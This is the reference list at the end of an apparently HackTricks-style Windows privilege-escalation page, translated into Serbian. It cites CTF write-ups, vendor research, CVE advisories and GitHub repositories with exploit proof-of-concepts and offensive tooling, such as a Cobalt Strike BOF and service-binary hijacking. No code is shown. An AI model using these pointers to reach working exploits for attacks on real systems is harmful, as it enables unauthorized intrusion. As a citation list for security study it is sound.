- [12] [0xdf – HTB/VulnLab JobTwo: phishing putem Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP (RCE) i krađa kernel tokena](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Potera za Silver Fox-om: mačka i miš u senkama kernela](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Ranjivost privilegovanog sistema datoteka u SCADA sistemu](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Alati za testiranje simboličkih veza – upotreba CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Veza s prošlošću. Zloupotreba simboličkih veza u Windows-u](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI – Node.js Trust Falls: opasno razrešavanje modula u Windows-u](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js moduli: učitavanje iz fascikli `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits – izazovi iz C/C++ kontrolne liste, rešeni](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn – funkcija RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery – NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone – CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone – Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own sa Microslop-om: povezivanje CLDFLT-a i DirectX kernel race condition-a za Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jedan I/O Ring da vlada svima: potpuni primitiv za čitanje/pisanje u Windows-u 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Zloupotreba proizvoljnog brisanja datoteka za eskalaciju privilegija i drugi sjajni trikovi](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC – exploit kod za FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS napadi, 2. deo: CVE-2020-1013, jednodnevna lokalna eskalacija privilegija u Windows-u 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Istraživanje Credential Manager-a i Windows Vault-a](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n – CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com – Kerberos Resource Based Constrained Delegation: kada promena slike dovede do eskalacije privilegija](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com – Izdvajanje privatnih SSH ključeva iz SSH agenta u Windows-u 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 1. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Pretvaranje serverskih sistema za ažuriranje preduzeća u fabrike backdoor-a (0_o) – 2. deo](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence – Eskalacija privilegija brisanjem fascikle Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center – CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec – Total Recall: praćenje koraka unazad do NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
{{#include ../../banners/hacktricks-training.md}}
